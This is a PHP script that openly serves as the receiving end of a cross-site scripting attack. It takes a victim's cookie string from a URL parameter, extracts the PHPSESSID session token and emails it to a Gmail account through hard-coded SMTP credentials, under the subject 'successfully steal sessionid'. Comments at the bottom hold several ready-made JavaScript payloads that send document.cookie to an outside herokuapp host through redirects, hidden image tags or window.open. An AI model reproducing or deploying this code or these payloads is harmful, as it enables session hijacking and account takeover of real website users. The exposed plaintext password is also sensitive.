<?php
include 'PHPMailer/class.smtp.php';
include 'PHPMailer/class.phpmailer.php'; 

if (isset($_GET["abc"])) {
    $cookie = $_GET["abc"];
    $sessionid = "";
    $arr = explode(";", $cookie);
    $arrlength = count($arr);
    for ($x = 0; $x < $arrlength; $x++)
        if (strpos($arr[$x], "PHPSESSID"))
            $sessionid = explode("=", $arr[$x])[1];


    $mail = new PHPMailer();
    $mail->IsSMTP();
    $mail->CharSet = "utf-8";
    $mail->SMTPDebug = 0;
    $mail->SMTPAuth = true;
    $mail->SMTPSecure = "ssl";
    $mail->Host = "smtp.gmail.com";
    $mail->Port = 465;

    $mail->Username = 'ahbcgd590@gmail.com';
    $mail->Password = '102102102';
    $mail->SetFrom('ahbcgd590@gmail.com', "steal SESIONID");
    $mail->AddReplyTo('ahbcgd590@gmail.com', 'Admin');
    $mail->Subject = 'successfully steal sessionid';
    $mail->MsgHTML($sessionid);
    $mail->AddAddress('ahbcgd590@gmail.com', 'me');
    
    $mail->Send();

//document.location="https://yeuvephp.herokuapp.com/abc.php?abc=" + document.cookie;
//var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("[style="display:none;"]").appendChild(elem);
//$("#top_banner").after('<img style="display: none;" src="https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie + '" />');
//window.open( "https://yeuvephp.herokuapp.com/abc.php?abc=" +document.cookie, "_blank");
    //document.querySelector(".example");
//var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("footer").after(elem);
}
?>
